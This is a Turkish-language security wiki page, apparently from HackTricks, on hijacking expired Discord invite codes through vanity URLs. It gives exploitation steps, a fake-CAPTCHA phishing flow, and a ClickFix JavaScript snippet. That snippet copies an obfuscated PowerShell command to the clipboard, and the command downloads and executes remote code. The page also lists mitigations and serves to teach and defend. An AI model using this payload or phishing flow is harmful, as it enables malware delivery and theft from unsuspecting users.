# Discord Davet Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord’un davet sistemi açığı, tehdit aktörlerinin süresi dolmuş veya silinmiş davet kodlarını (geçici, kalıcı veya özel vanity) herhangi bir Seviye 3 artırılmış sunucuda yeni vanity bağlantıları olarak talep etmesine olanak tanır. Tüm kodları küçük harfe normalize ederek, saldırganlar bilinen davet kodlarını önceden kaydedebilir ve orijinal bağlantı süresi dolduğunda veya kaynak sunucu artırmasını kaybettiğinde trafiği sessizce ele geçirebilirler.

## Davet Türleri ve Ele Geçirme Riski

| Davet Türü           | Ele Geçirilebilir mi? | Koşul / Yorumlar                                                                                       |
|-----------------------|-----------------------|--------------------------------------------------------------------------------------------------------|
| Geçici Davet Bağlantısı | ✅                    | Süresi dolduktan sonra, kod mevcut hale gelir ve artırılmış bir sunucu tarafından vanity URL olarak yeniden kaydedilebilir. |
| Kalıcı Davet Bağlantısı | ⚠️                    | Silinirse ve yalnızca küçük harfler ve rakamlardan oluşuyorsa, kod tekrar mevcut hale gelebilir.        |
| Özel Vanity Bağlantısı  | ✅                    | Orijinal sunucu Seviye 3 Boost'unu kaybederse, vanity daveti yeni kayıt için mevcut hale gelir.      |

## Sömürü Adımları

1. Keşif
- `discord.gg/{code}` veya `discord.com/invite/{code}` desenine uyan davet bağlantılarını izlemek için kamu kaynaklarını (forumlar, sosyal medya, Telegram kanalları) takip edin.
- İlginç davet kodlarını toplayın (geçici veya vanity).
2. Ön Kayıt
- Seviye 3 Boost ayrıcalıklarına sahip bir Discord sunucusu oluşturun veya mevcut bir sunucuyu kullanın.
- **Sunucu Ayarları → Vanity URL** kısmında hedef davet kodunu atamayı deneyin. Kabul edilirse, kod kötü niyetli sunucu tarafından rezerve edilir.
3. Ele Geçirme Aktivasyonu
- Geçici davetler için, orijinal davetin süresi dolana kadar bekleyin (veya kaynağı kontrol ediyorsanız manuel olarak silin).
- Büyük harf içeren kodlar için, küçük harfli versiyonu hemen talep edilebilir, ancak yönlendirme yalnızca süresi dolduktan sonra aktif olur.
4. Sessiz Yönlendirme
- Eski bağlantıyı ziyaret eden kullanıcılar, ele geçirme aktif olduğunda saldırgan kontrolündeki sunucuya sorunsuz bir şekilde yönlendirilir.

## Discord Sunucusu Üzerinden Phishing Akışı

1. Sunucu kanallarını kısıtlayarak yalnızca bir **#verify** kanalının görünür olmasını sağlayın.
2. Yeni gelenleri OAuth2 ile doğrulamaya yönlendirmek için bir bot (örneğin, **Safeguard#0786**) dağıtın.
3. Bot, kullanıcıları bir CAPTCHA veya doğrulama adımı kılıfında bir phishing sitesine (örneğin, `captchaguard.me`) yönlendirir.
4. **ClickFix** UX hilesini uygulayın:
- Bozuk bir CAPTCHA mesajı gösterin.
- Kullanıcıları **Win+R** diyalogunu açmaya, önceden yüklenmiş bir PowerShell komutunu yapıştırmaya ve Enter tuşuna basmaya yönlendirin.

### ClickFix Panoya Enjeksiyon Örneği
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Bu yaklaşım, doğrudan dosya indirmelerini önler ve kullanıcı şüphesini azaltmak için tanıdık UI öğelerini kullanır.

## Önlemler

- En az bir büyük harf veya alfasayısal olmayan karakter içeren kalıcı davet bağlantıları kullanın (asla süresi dolmaz, yeniden kullanılmaz).
- Davet kodlarını düzenli olarak değiştirin ve eski bağlantıları iptal edin.
- Discord sunucu destek durumunu ve vanity URL taleplerini izleyin.
- Kullanıcıları sunucu kimliğini doğrulamaya ve panoya kopyalanmış komutları çalıştırmaktan kaçınmaya eğitin.

## Referanslar

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
